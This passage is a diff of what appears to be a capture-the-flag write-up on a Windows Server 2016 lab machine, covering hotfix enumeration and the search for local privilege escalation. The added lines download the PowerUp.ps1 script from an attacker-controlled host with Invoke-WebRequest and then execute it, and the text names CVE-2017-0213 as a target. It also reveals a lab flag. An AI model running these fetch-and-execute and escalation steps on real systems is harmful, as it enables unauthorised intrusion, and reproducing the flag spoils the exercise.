@@ -92,7 +92,6 @@ Progress: 873100 / 873104 (100.00%)
 ===============================================================
 Finished
 ===============================================================
-root@ip-10-67-76-166:~# 
 ```
 User.txt contains 3b99fbdc6d430bfb51c72c651a261927. 
 
@@ -110,9 +109,7 @@ So had a closer look
 
 systeminfo and wmic qfe and found:
 
-**wmic qfe** re-organised make it easier to view
-Installed Hotfixes
-==================
+Starting with wmic qfe 
 
 HotFix ID     : KB3192137
 Description   : Update
@@ -122,6 +119,7 @@ System        : RETROWEB
 
 Microsoft KB  : https://support.microsoft.com/?kbid=3192137
 
+Literally just one hot fix as old as the OS. This opens doors for exploits. To get idea of OS version, 'systeminfo' is more detailed than 'winver' but both provide enough here.
 
 C:\Users\Wade>systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
 OS Name:                   Microsoft Windows Server 2016 Standard
@@ -133,3 +131,22 @@ Observation:
   Very few updates installed.
   Build 14393 is a known target for CVE-2017-0213.
   Investigated CVE-2017-0213 as a potential local privilege escalation vector.
+
+
+But first Try a few options to find exploit opertunities:
+
+PowerUp.ps1 (unfortunately several options, all list canrestart as false nothing immediately obvious here)
+
+```
+PS C:\Users\Wade> Invoke-webrequest -Uri http://10.67.95.37:80/PowerUp.ps1 -outfile powerups.ps1
+PS C:\Users\Wade> . .\powerups.ps1
+PS C:\Users\Wade> Invoke-AllChecks
+
+
+ServiceName    : AWSLiteAgent
+...
+CanRestart     : False
+...
+Check          : Unquoted Service Paths
+...
+```
